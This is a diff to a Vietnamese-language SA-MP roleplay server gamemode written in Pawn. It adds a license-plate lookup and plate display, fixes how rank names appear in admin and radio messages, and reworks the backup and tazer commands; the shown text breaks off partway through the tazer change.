@@ -1,3 +1,4 @@
+#define MAX_VEHICLE_HEATH 900.0
 
 CMD:clearbugs(playerid, params[])
 {
@@ -3292,7 +3293,7 @@ CMD:mdc(playerid, params[])
 	{
         if(IsPlayerInAnyVehicle(playerid))
 		{
-            ShowPlayerDialog(playerid, MDC_MAIN, DIALOG_STYLE_LIST, "SA-MDC - Logged in", "*Civilian Information\n*Find LEO\n*Law Enforcement Agencies\n*MDC Message\n*SMS", "Dong y", "CancelHuy bo");
+            ShowPlayerDialog(playerid, MDC_MAIN, DIALOG_STYLE_LIST, "SA-MDC - Logged in", "*Civilian Information\n*Find LEO\n*Law Enforcement Agencies\n*MDC Message\n*SMS\nTra cuu bien so xe", "Dong y", "CancelHuy bo");
             ConnectedToPC[playerid] = 1337;
         }
         else SendErrorMessage(playerid, " Ban khong the lam dieu nay tren xe.");
@@ -6106,6 +6107,10 @@ CMD:badge(playerid, params[])
 			{
 				Medics -= 1;
 			}
+			if(IsACop(playerid))
+			{
+				Cops -= 1;
+			}
 		}
 		else
 		{
@@ -6116,6 +6121,10 @@ CMD:badge(playerid, params[])
 			if(IsAMedic(playerid))
 			{
 				Medics += 1;
+			}
+			if(IsACop(playerid))
+			{
+				Cops += 1;
 			}
 		}
 	}
@@ -11232,7 +11241,7 @@ CMD:join(playerid, params[])
                   return 1;
                }
 		} */
-		else if (IsPlayerInRangeOfPoint(playerid,5.0, 58.5952, -292.2914, 1.5781)) {
+		else if (IsPlayerInRangeOfPoint(playerid,5.0, 2447.0867,-2100.8335,13.5469)) {
 			if(PlayerInfo[playerid][pJob] == 0)
 			{
 				ShowPlayerDialog(playerid,DIALOG_XINVIEC,0,"He thong cong viec","Day la cong viec Tai Xe,cong viec nay la ban se cho nhung chiec hang hoa de kiem tien\nCMD:/truckergo car va /truckergo buy/sell\nCong viec nay ban can co phuong tien theo yeu cau moi co the lam va viec nay kiem duoc kha nhieu tien!", "Hieu", ""); //TRUCKERJOB
@@ -13430,6 +13439,22 @@ CMD:suachuaxe(playerid, params[])
 	return 1;
 }
 
+stock Float: GetVehicleMaxHealth(vehicleid)
+{
+    foreach(new i: Player)
+    {
+        for(new d; d < MAX_PLAYERVEHICLES; d++)
+        {
+            if(PlayerVehicleInfo[i][d][pvId] == vehicleid)
+            {
+                return (PlayerVehicleInfo[i][d][pvMaxHealth]);
+            }
+        }
+    }
+    return MAX_VEHICLE_HEATH;
+}
+
+
 CMD:fixveh(playerid, params[])
 {
     if(IsPlayerConnected(playerid)) {
@@ -13935,7 +13960,7 @@ CMD:freezebank(playerid, params[])
     {
         PlayerInfo[giveplayerid][pFreezeBank] = 1;
        	GetPlayerGroupInfo(playerid, rank, division, employer);
-	   	format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has froze %s bank account.", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
+	   	format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has froze %s bank account.", rank, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
     	ABroadCast(COLOR_YELLOW,string, 2);
     	format(string, sizeof(string), "You have frozen %s's bank account.", GetPlayerNameEx(giveplayerid));
    	 	SendClientMessageEx(playerid, COLOR_WHITE, string);
@@ -13945,7 +13970,7 @@ CMD:freezebank(playerid, params[])
     else
     {
 		PlayerInfo[giveplayerid][pFreezeBank] = 0;
-		format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has unfrozen %s bank account.", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
+		format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has unfrozen %s bank account.", rank, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
 		ABroadCast(COLOR_YELLOW,string, 2);
 		format(string, sizeof(string), "You have unfrozen %s's bank account.", GetPlayerNameEx(giveplayerid));
 		SendClientMessageEx(playerid, COLOR_WHITE, string);
@@ -13973,7 +13998,7 @@ CMD:freezeassets(playerid, params[])
 	    {
 			PlayerInfo[giveplayerid][pFreezeHouse] = 1;
 	       	GetPlayerGroupInfo(playerid, rank, division, employer);
-		   	format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has frozen %s house assets.", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
+		   	format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has frozen %s house assets.", rank, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
 		   	ABroadCast(COLOR_YELLOW,string, 2);
 		   	format(string, sizeof(string), "You have frozen %s's house assets.", GetPlayerNameEx(giveplayerid));
 	   	 	SendClientMessageEx(playerid, COLOR_WHITE, string);
@@ -13983,7 +14008,7 @@ CMD:freezeassets(playerid, params[])
 	    else
 	    {
 	        PlayerInfo[giveplayerid][pFreezeHouse] = 0;
-			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has unfrozen %s house assets.", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
+			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has unfrozen %s house assets.", rank, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
 	    	ABroadCast(COLOR_YELLOW,string, 2);
 		   	format(string, sizeof(string), "You have unfrozen %s's house assets.", GetPlayerNameEx(giveplayerid));
 	   	 	SendClientMessageEx(playerid, COLOR_WHITE, string);
@@ -13997,7 +14022,7 @@ CMD:freezeassets(playerid, params[])
 		{
 			PlayerInfo[giveplayerid][pFreezeCar] = 1;
 	       	GetPlayerGroupInfo(playerid, rank, division, employer);
-			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has frozen %s vehicle assets.", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
+			format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has frozen %s vehicle assets.", rank, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
 	    	ABroadCast(COLOR_YELLOW,string, 2);
 	    	format(string, sizeof(string), "You have frozen %s's vehicle assets.", GetPlayerNameEx(giveplayerid));
 	   	 	SendClientMessageEx(playerid, COLOR_WHITE, string);
@@ -14007,7 +14032,7 @@ CMD:freezeassets(playerid, params[])
 	    else
 	    {
 	        PlayerInfo[giveplayerid][pFreezeCar] = 0;
-	        format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has unfrozen %s vehicle assets.", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
+	        format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has unfrozen %s vehicle assets.", rank, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
 	    	ABroadCast(COLOR_YELLOW,string, 2);
 	    	format(string, sizeof(string), "You have unfrozen %s's vehicle assets.", GetPlayerNameEx(giveplayerid));
 		 	SendClientMessageEx(playerid, COLOR_WHITE, string);
@@ -14042,16 +14067,16 @@ CMD:reward(playerid, params[])
   		if(money < 1 || money > 50000) return SendClientMessageEx(playerid, COLOR_GRAD5, "Reward amount cannot be lower than $1 or higher than $50,000!");
     	new rank[GROUP_MAX_RANK_LEN], division[GROUP_MAX_DIV_LEN], employer[GROUP_MAX_NAME_LEN];
    		GetPlayerGroupInfo(playerid, rank, division, employer);
-	    format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has just rewarded %s $%d.", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), money);
+	    format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s %s has just rewarded %s $%d.", rank, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), money);
 	    ABroadCast(COLOR_YELLOW,string, 2);
 
-		format(string, sizeof(string), "AdmCmd: %s %s has just rewarded %s $%d", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), money);
+		format(string, sizeof(string), "AdmCmd: %s %s has just rewarded %s $%d", rank, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), money);
 		Log("logs/rpspecial.log", string);
 		Tax -= money;
   		GivePlayerCash(giveplayerid, money);
     	format(string, sizeof(string), "You have given a reward of $%d to %s.", money, GetPlayerNameEx(giveplayerid));
 	    SendClientMessageEx(playerid, COLOR_WHITE, string);
-	    format(string, sizeof(string), "You have recieved a reward of $%d from %s %s.", money, PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid));
+	    format(string, sizeof(string), "You have recieved a reward of $%d from %s %s.", money, rank, GetPlayerNameEx(playerid));
 	   	SendClientMessageEx(giveplayerid, COLOR_WHITE, string);
 	}
 	return 1;
@@ -14078,8 +14103,8 @@ CMD:reversejudgement(playerid, params[])
 			PlayerInfo[giveplayerid][pJudgeJailTime] = 0;
    			switch(PlayerInfo[playerid][pSex])
 			{
-			    case 1: format(string, sizeof(string), "%s %s has reversed %s's judgement, he is free to go.", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
-			    case 2: format(string, sizeof(string), "%s %s has reversed %s's judgement, she is free to go.", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
+			    case 1: format(string, sizeof(string), "%s %s has reversed %s's judgement, he is free to go.", rank, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
+			    case 2: format(string, sizeof(string), "%s %s has reversed %s's judgement, she is free to go.", rank, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
 			}
    			SendGroupMessage(1, DEPTRADIO, string);
    		}
@@ -18060,7 +18085,7 @@ CMD:cades(playerid, params[])
 CMD:spikes(playerid, params[])
 {
 	if (PlayerInfo[playerid][pMember] != INVALID_GROUP_ID && PlayerInfo[playerid][pRank] >= arrGroupData[PlayerInfo[playerid][pMember]][g_iSpikeStrips]) {
-		SendServerMessage(playerid, " Current deployed spikes:");
+		SendClientMessageEx(playerid, COLOR_WHITE, "Current deployed spikes:");
 		for(new i, string[56 + MAX_ZONE_NAME + MAX_PLAYER_NAME]; i < sizeof(SpikeStrips); i++)
 		{
 			if(SpikeStrips[i][sX] != 0 && SpikeStrips[i][sY] != 0 && SpikeStrips[i][sZ] != 0) // Checking for next available ID.
@@ -18069,7 +18094,7 @@ CMD:spikes(playerid, params[])
 				SendClientMessageEx(playerid, COLOR_GRAD2, string);
 			}
 		}
-	} else SendErrorMessage(playerid, " Ban khong duoc phep su dung lenh nay.");
+	} else SendClientMessageEx(playerid, COLOR_GRAD2, "Ban khong duoc phep su dung lenh nay.");
 	return 1;
 }
 
@@ -18167,80 +18192,80 @@ CMD:emergencybutton(playerid, params[]) {
 }
 CMD:bp3(playerid, params[])
 {
-	if(Backup[playerid] == 0)
+	// if(Backup[playerid] == 0)
+	// {
+	if(IsACop(playerid) || IsAMedic(playerid))
 	{
-	    if(IsACop(playerid) || IsAMedic(playerid))
+		new 
+		zone[MAX_ZONE_NAME],
+		string[128];
+		GetPlayer3DZone(playerid, zone, sizeof(zone));
+		format(string, sizeof(string), "* %s yeu cau backup tren radio cua ho.", GetPlayerNameEx(playerid));
+		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
+		format(string, sizeof(string), "* %s yeu cau backup tai %s. {AA3333}Dap ung Code 3 [Lights and Sirens].", GetPlayerNameEx(playerid), zone);
+		ShowBackupActiveForPlayer(playerid);
+		Backup[playerid] = 1;
+		foreach(Player, i)
 		{
-		    new 
-			zone[MAX_ZONE_NAME],
-			string[128];
-		    GetPlayer3DZone(playerid, zone, sizeof(zone));
-			format(string, sizeof(string), "* %s yeu cau backup tren radio cua ho.", GetPlayerNameEx(playerid));
-			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
-			format(string, sizeof(string), "* %s yeu cau backup tai %s. {AA3333}Dap ung Code 3 [Lights and Sirens].", GetPlayerNameEx(playerid), zone);
-	        ShowBackupActiveForPlayer(playerid);
-			Backup[playerid] = 1;
-			foreach(Player, i)
+			if(PlayerInfo[playerid][pMember] == PlayerInfo[i][pMember])
 			{
-				if(PlayerInfo[playerid][pMember] == PlayerInfo[i][pMember])
-				{
-	      			SetPlayerMarkerForPlayer(i, playerid, 0x2641FEAA);
-					SendClientMessageEx(i, arrGroupData[PlayerInfo[playerid][pMember]][g_hRadioColour] * 256 + 255, string);
-				}
+				SetPlayerMarkerForPlayer(i, playerid, 0x2641FEAA);
+				SendClientMessageEx(i, arrGroupData[PlayerInfo[playerid][pMember]][g_hRadioColour] * 256 + 255, string);
 			}
-			SendServerMessage(playerid, " Su dung /backup mot lan nua de ha thap yeu cau backup cua ban xuong code 2.");
-			SendServerMessage(playerid, " Su dung /nobackup de xoa yeu cau backup.");
-			if(BackupClearTimer[playerid] != 0)
-			{
-				KillTimer(BackupClearTimer[playerid]);
-				BackupClearTimer[playerid] = 0;
-			}
-			BackupClearTimer[playerid] = SetTimerEx("BackupClear", 300000, false, "ii", playerid, 1);
 		}
-		else
+		SendServerMessage(playerid, " Su dung /backup mot lan nua de ha thap yeu cau backup cua ban xuong code 2.");
+		SendServerMessage(playerid, " Su dung /nobackup de xoa yeu cau backup.");
+		if(BackupClearTimer[playerid] != 0)
 		{
-			SendErrorMessage(playerid, "    Ban khong phai nhan vien thuc thi phap luat hoac bac si!");
+			KillTimer(BackupClearTimer[playerid]);
+			BackupClearTimer[playerid] = 0;
 		}
-	} else return SendErrorMessage(playerid, " Ban dang bat backup roi, vui long /nobackup (/nbp) de tat.");
+		BackupClearTimer[playerid] = SetTimerEx("BackupClear", 300000, false, "ii", playerid, 1);
+	}
+	else
+	{
+		SendErrorMessage(playerid, "    Ban khong phai nhan vien thuc thi phap luat hoac bac si!");
+	}
+	// } else return SendErrorMessage(playerid, " Ban dang bat backup roi, vui long /nobackup (/nbp) de tat.");
 	return 1;
 }
 CMD:bp2(playerid, params[])
 {
-	if(Backup[playerid] == 0)
+	// if(Backup[playerid] == 0)
+	// {
+	if(IsACop(playerid) || IsAMedic(playerid))
 	{
-	    if(IsACop(playerid) || IsAMedic(playerid))
+		new 
+		zone[MAX_ZONE_NAME],
+		string[128];
+		GetPlayer3DZone(playerid, zone, sizeof(zone));
+		format(string, sizeof(string), "* %s yeu cau backup tren radio cua ho.", GetPlayerNameEx(playerid));
+		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
+		format(string, sizeof(string), "* %s yeu cau backup tai %s. {00FF33}Dap ung Code 2 [No Lights and Sirens].", GetPlayerNameEx(playerid), zone);
+		ShowBackupActiveForPlayer(playerid);
+		Backup[playerid] = 2;
+		foreach(Player, i)
 		{
-		    new 
-			zone[MAX_ZONE_NAME],
-			string[128];
-		    GetPlayer3DZone(playerid, zone, sizeof(zone));
-			format(string, sizeof(string), "* %s yeu cau backup tren radio cua ho.", GetPlayerNameEx(playerid));
-			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
-			format(string, sizeof(string), "* %s yeu cau backup tai %s. {00FF33}Dap ung Code 2 [No Lights and Sirens].", GetPlayerNameEx(playerid), zone);
-	        ShowBackupActiveForPlayer(playerid);
-			Backup[playerid] = 2;
-			foreach(Player, i)
+			if(PlayerInfo[playerid][pMember] == PlayerInfo[i][pMember])
 			{
-				if(PlayerInfo[playerid][pMember] == PlayerInfo[i][pMember])
-				{
-	  				SetPlayerMarkerForPlayer(i, playerid, 0x00FF33AA);
-					SendClientMessageEx(i,  arrGroupData[PlayerInfo[playerid][pMember]][g_hRadioColour] * 256 + 255, string);
-				}
+				SetPlayerMarkerForPlayer(i, playerid, 0x00FF33AA);
+				SendClientMessageEx(i,  arrGroupData[PlayerInfo[playerid][pMember]][g_hRadioColour] * 256 + 255, string);
 			}
-			SendServerMessage(playerid, " Su dung /backup mot lan nua de nang yeu cau backup cua ban len code 3.");
-			SendServerMessage(playerid, " Su dung /nobackup de xoa yeu cau backup.");
-			if(BackupClearTimer[playerid] != 0)
-			{
-				KillTimer(BackupClearTimer[playerid]);
-				BackupClearTimer[playerid] = 0;
-			}
-			BackupClearTimer[playerid] = SetTimerEx("BackupClear", 300000, false, "ii", playerid, 1);
 		}
-		else
+		SendServerMessage(playerid, " Su dung /backup mot lan nua de nang yeu cau backup cua ban len code 3.");
+		SendServerMessage(playerid, " Su dung /nobackup de xoa yeu cau backup.");
+		if(BackupClearTimer[playerid] != 0)
 		{
-			SendErrorMessage(playerid, "    Ban khong phai nhan vien thuc thi phap luat hoac bac si!");
+			KillTimer(BackupClearTimer[playerid]);
+			BackupClearTimer[playerid] = 0;
 		}
-	} else return SendErrorMessage(playerid, " Ban dang bat backup roi, vui long /nobackup (/nbp) de tat.");
+		BackupClearTimer[playerid] = SetTimerEx("BackupClear", 300000, false, "ii", playerid, 1);
+	}
+	else
+	{
+		SendErrorMessage(playerid, "    Ban khong phai nhan vien thuc thi phap luat hoac bac si!");
+	}
+	// } else return SendErrorMessage(playerid, " Ban dang bat backup roi, vui long /nobackup (/nbp) de tat.");
 	return 1;
 }
 CMD:backup(playerid, params[])
@@ -18511,26 +18536,30 @@ CMD:chinhxe(playerid, params[])
 	{
 		new vstring[4096], icount = GetPlayerVehicleSlots(playerid);
 		new statez[30];
-		vstring = "Phuong tien\tTinh trang\tGiay to xe";
+		vstring = "Phuong tien\tTinh trang\tGiay to xe\tBien So Xe";
 		for(new i, iModelID; i < icount; i++)
 		{
 			if((iModelID = PlayerVehicleInfo[playerid][i][pvModelId] - 400) >= 0)
 			{
+				new VehSignstr[1280], VehSignID = FindVehSign(PlayerVehicleInfo[playerid][i][pvSlotId]);
+				if(VehSignID != -1){
+					format(VehSignstr, sizeof(VehSignstr), "SF-%d", VehSignInfo[VehSignID][vs_VehSign]);
+				} else VehSignstr = "{c54640}Chua dang ky{FFFFFF}";
 				switch(PlayerVehicleInfo[playerid][i][pvGiayToXe]) 
 				{
 					case 0: statez = "{c54640}Chua dang ky{FFFFFF}";
 					case 1: statez = "{36e198}Da dang ky{FFFFFF}";
 				}
 				if(PlayerVehicleInfo[playerid][i][pvImpounded]) {
-					format(vstring, sizeof(vstring), "%s\n[%d]%s\t{f0635c}Tich thu{ffffff}\t%s", vstring,PlayerVehicleInfo[playerid][i][pvSlotId], VehicleName[iModelID],statez);
+					format(vstring, sizeof(vstring), "%s\n[%d]%s\t{f0635c}Tich thu{ffffff}\t%s\t%s", vstring,PlayerVehicleInfo[playerid][i][pvSlotId], VehicleName[iModelID],statez,VehSignstr);
 				}
 				else if(PlayerVehicleInfo[playerid][i][pvDisabled]) {
-					format(vstring, sizeof(vstring), "%s\n[%d]%s\t{f0635c}Khong dung duoc{ffffff}\t%s", vstring,PlayerVehicleInfo[playerid][i][pvSlotId], VehicleName[iModelID],statez);
+					format(vstring, sizeof(vstring), "%s\n[%d]%s\t{f0635c}Khong dung duoc{ffffff}\t%s\t%s", vstring,PlayerVehicleInfo[playerid][i][pvSlotId], VehicleName[iModelID],statez,VehSignstr);
 				}
 				else if(!PlayerVehicleInfo[playerid][i][pvSpawned]) {
-					format(vstring, sizeof(vstring), "%s\n[%d]%s\t{eedf4f}Trong Garage{ffffff}\t%s", vstring,PlayerVehicleInfo[playerid][i][pvSlotId], VehicleName[iModelID],statez);
+					format(vstring, sizeof(vstring), "%s\n[%d]%s\t{eedf4f}Trong Garage{ffffff}\t%s\t%s", vstring,PlayerVehicleInfo[playerid][i][pvSlotId], VehicleName[iModelID],statez,VehSignstr);
 				}
-				else format(vstring, sizeof(vstring), "%s\n[%d]%s\t{7fe39a}Dang su dung{ffffff}\t%s", vstring,PlayerVehicleInfo[playerid][i][pvSlotId], VehicleName[iModelID],statez);
+				else format(vstring, sizeof(vstring), "%s\n[%d]%s\t{7fe39a}Dang su dung{ffffff}\t%s\t%s", vstring,PlayerVehicleInfo[playerid][i][pvSlotId], VehicleName[iModelID],statez,VehSignstr);
 			}
 			else strcat(vstring, "\nTrong");
 		}
@@ -21687,7 +21716,7 @@ CMD:ipwhitelist(playerid, params[])
 	return 1;
 }
 
-CMD:setcapping(playerid, params[]) {
+/* CMD:setcapping(playerid, params[]) {
 	if(PlayerInfo[playerid][pAdmin] >= 4) {
 		if(isnull(params)) {
 			return SendUsageMessage(playerid, " /setcapping [ping]");
@@ -21708,7 +21737,7 @@ CMD:setcapping(playerid, params[]) {
 		pointpinglimit = iPingas;
 	}
 	return 1;
-}
+} */
 
 CMD:hosp(playerid, params[]) {
 	return cmd_hospital(playerid, params);
@@ -25401,7 +25430,7 @@ CMD:showbadge(playerid, params[])
 				GetPlayerGroupInfo(playerid, infoArrays[0], infoArrays[1], infoArrays[2]);
 
 				SendClientMessageEx(giveplayerid, COLOR_GRAD2, "----------------------------------------------------------------------------------------------------");
-				format(string, sizeof(string), "%s %s is a duly sworn member of the %s.", PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), infoArrays[2]);
+				format(string, sizeof(string), "%s %s is a duly sworn member of the %s.", infoArrays[0], GetPlayerNameEx(playerid), infoArrays[2]);
 				SendClientMessageEx(giveplayerid, COLOR_WHITE, string);
 				format(string, sizeof(string), "Current Assignment: %s.", infoArrays[1]);
 				SendClientMessageEx(giveplayerid, COLOR_WHITE, string);
@@ -25511,9 +25540,9 @@ CMD:r(playerid, params[]) {
 					SetPlayerChatBubble(playerid, string, COLOR_WHITE, 15.0, 5000);
 					GetPlayerGroupInfo(playerid, rank, division, employer);
 					if(PlayerInfo[playerid][pDivision] > 0)
-						format(string, sizeof(string), "**[CH: 911, DIV: %s] [%d] %s %s: %s **", arrGroupDivisions[iGroupID][PlayerInfo[playerid][pDivision]], PlayerInfo[playerid][pMaHieu1],arrGroupRanks[iGroupID][PlayerInfo[playerid][pRank]], GetPlayerNameEx(playerid), params);
+						format(string, sizeof(string), "**[CH: 911, DIV: %s] [%d] %s %s: %s **", arrGroupDivisions[iGroupID][PlayerInfo[playerid][pDivision]], PlayerInfo[playerid][pMaHieu1],rank, GetPlayerNameEx(playerid), params);
 					else
-						format(string, sizeof(string), "**[CH: 911, DIV: None] [%d] %s %s: %s **", PlayerInfo[playerid][pMaHieu1],arrGroupRanks[iGroupID][PlayerInfo[playerid][pRank]], GetPlayerNameEx(playerid), params);
+						format(string, sizeof(string), "**[CH: 911, DIV: None] [%d] %s %s: %s **", PlayerInfo[playerid][pMaHieu1],rank, GetPlayerNameEx(playerid), params);
 					foreach(new i: Player)
 					{
 						if(GetPVarInt(i, "togRadio") == 0)
@@ -25553,7 +25582,7 @@ CMD:r2(playerid, params[]) {
 					format(string, sizeof(string), "(radio) %s", params);
 					SetPlayerChatBubble(playerid, string, COLOR_WHITE, 15.0, 5000);
 					GetPlayerGroupInfo(playerid, rank, division, employer);
-					format(string, sizeof(string), "**[CH: 911, S: %s] [%d] %s %s: %s **", division,PlayerInfo[playerid][pMaHieu1],PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), params);
+					format(string, sizeof(string), "**[CH: 911, S: %s] [%d] %s %s: %s **", division,PlayerInfo[playerid][pMaHieu1],rank, GetPlayerNameEx(playerid), params);
 					foreach(new i: Player)
 					{
 						if(GetPVarInt(i, "togRadio") == 0)
@@ -25596,7 +25625,7 @@ CMD:international(playerid, params[])
 	        {
 	            new szRadio[128], szEmployer[GROUP_MAX_NAME_LEN], szRank[GROUP_MAX_RANK_LEN], szDivision[GROUP_MAX_DIV_LEN];
 	            GetPlayerGroupInfo(playerid, szRank, szDivision, szEmployer);
-	            format(szRadio, sizeof(szRadio), "** %s %s (%s) %s: %s **", szEmployer, PlayerInfo[playerid][pRankText], szDivision, GetPlayerNameEx(playerid), params);
+	            format(szRadio, sizeof(szRadio), "** %s %s (%s) %s: %s **", szEmployer, szRank, szDivision, GetPlayerNameEx(playerid), params);
 	            foreach(new i: Player)
 	            {
 	                if((0 <= PlayerInfo[i][pMember] < MAX_GROUPS) && PlayerInfo[i][pRank] >= arrGroupData[PlayerInfo[i][pMember]][g_iIntRadioAccess])
@@ -25644,7 +25673,7 @@ CMD:dept(playerid, params[])
 				{
 					new szRadio[128], RadioBubble[128], szEmployer[GROUP_MAX_NAME_LEN], szRank[GROUP_MAX_RANK_LEN], szDivision[GROUP_MAX_DIV_LEN];
 					GetPlayerGroupInfo(playerid, szRank, szDivision, szEmployer);
-					format(szRadio, sizeof(szRadio), "** %s %s (%s) %s: %s **", szEmployer, PlayerInfo[playerid][pRankText], szDivision, GetPlayerNameEx(playerid), params);
+					format(szRadio, sizeof(szRadio), "** %s %s (%s) %s: %s **", szEmployer, szRank, szDivision, GetPlayerNameEx(playerid), params);
 					format(RadioBubble, sizeof(RadioBubble), "(radio) %s",params);
 					SetPlayerChatBubble(playerid, RadioBubble, COLOR_WHITE, 15.0, 5000);
 					foreach(new i: Player)
@@ -34595,7 +34624,7 @@ CMD:leaders(playerid, params[])
 		{
 			if(PlayerInfo[i][pLeader] >= 0) {
 				GetPlayerGroupInfo(i, sz_FacInfo[0], sz_FacInfo[1], sz_FacInfo[2]);
-				format(string, sizeof(string), "(%s) %s %s", sz_FacInfo[2], PlayerInfo[playerid][pRankText], GetPlayerNameEx(i));
+				format(string, sizeof(string), "(%s) %s %s", sz_FacInfo[2], sz_FacInfo[0], GetPlayerNameEx(i));
 				SendClientMessageEx(playerid, COLOR_GRAD2, string);
 			}
 		}
@@ -35420,7 +35449,7 @@ CMD:revokelicense(playerid, params[])
 					GetPlayerGroupInfo(playerid, sz_FacInfo[0], sz_FacInfo[1], sz_FacInfo[2]);
 					format(string,sizeof(string),"Nhan vien %s da thu hoi giay phep lai xe cua ban, ly do: %s.", sz_FacInfo[2], reason);
 					SendClientMessageEx(giveplayerid,COLOR_LIGHTBLUE,string);
-					format(string,sizeof(string),"HQ: %s %s %s da thu hoi %s' giay phep lai xe, ly do: %s.", sz_FacInfo[2], PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
+					format(string,sizeof(string),"HQ: %s %s %s da thu hoi %s' giay phep lai xe, ly do: %s.", sz_FacInfo[2], sz_FacInfo[0], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
 					SendGroupMessage(1,TEAM_BLUE_COLOR,string);
 					format(string,sizeof(string),"Ban da thu hoi %s' giay phep lai xe.",GetPlayerNameEx(giveplayerid));
 					SendClientMessageEx(playerid,COLOR_WHITE,string);
@@ -35436,7 +35465,7 @@ CMD:revokelicense(playerid, params[])
 					GetPlayerGroupInfo(playerid, sz_FacInfo[0], sz_FacInfo[1], sz_FacInfo[2]);
 					format(string,sizeof(string),"Nhan vien %s da thu hoi giay phep lai thuyen cua ban, ly do: %s.", sz_FacInfo[2], reason);
 					SendClientMessageEx(giveplayerid,COLOR_LIGHTBLUE,string);
-					format(string,sizeof(string),"HQ: %s %s %s da thu hoi %s' giay phep lai thuyen, ly do: %s.", sz_FacInfo[2], PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
+					format(string,sizeof(string),"HQ: %s %s %s da thu hoi %s' giay phep lai thuyen, ly do: %s.", sz_FacInfo[2], sz_FacInfo[0], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
 					SendGroupMessage(1,TEAM_BLUE_COLOR,string);
 					format(string,sizeof(string),"Ban da thu hoi %s' giay phep lai thuyen.",GetPlayerNameEx(giveplayerid));
 					SendClientMessageEx(playerid,COLOR_WHITE,string);
@@ -35452,7 +35481,7 @@ CMD:revokelicense(playerid, params[])
 					GetPlayerGroupInfo(playerid, sz_FacInfo[0], sz_FacInfo[1], sz_FacInfo[2]);
 					format(string,sizeof(string),"Nhan vien %s da thu hoi giay phep lai may bay cua ban, ly do: %s.", sz_FacInfo[2], reason);
 					SendClientMessageEx(giveplayerid,COLOR_LIGHTBLUE,string);
-					format(string,sizeof(string),"HQ: %s %s %s da thu hoi %s' giay phep lai may bay, ly do: %s.", sz_FacInfo[2], PlayerInfo[playerid][pRankText], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
+					format(string,sizeof(string),"HQ: %s %s %s da thu hoi %s' giay phep lai may bay, ly do: %s.", sz_FacInfo[2], sz_FacInfo[0], GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), reason);
 					SendGroupMessage(1,TEAM_BLUE_COLOR,string);
 					format(string,sizeof(string),"Ban da thu hoi %s' giay phep lai may bay.",GetPlayerNameEx(giveplayerid));
 					SendClientMessageEx(playerid,COLOR_WHITE,string);
@@ -42451,19 +42480,37 @@ CMD:tazer(playerid, params[])
 		}
 		if(pTazer{playerid} == 0)
 		{
-			new wep, amo;
-		    GetPlayerWeaponData(playerid, 2, wep, amo);
-		    pTazerAmmoReplace{playerid} = amo;
-			pTazerReplace{playerid} = PlayerInfo[playerid][pGuns][2];
+			new myweapons[13][2], weaponname[50];
+			for (new i = 0; i < 13; i++)
+			{
+				GetPlayerWeaponData(playerid, i, myweapons[i][0], myweapons[i][1]);
+				GetWeaponName(myweapons[i][0], weaponname, sizeof(weaponname));
+				if(strcmp(weaponname, "Desert Eagle", true) == 0) 
+				{
+					SendClientMessage(playerid,COLOR_LIGHTBLUE,"> Da cat vu khi Deagle vao tui do khi su dung tazer.");
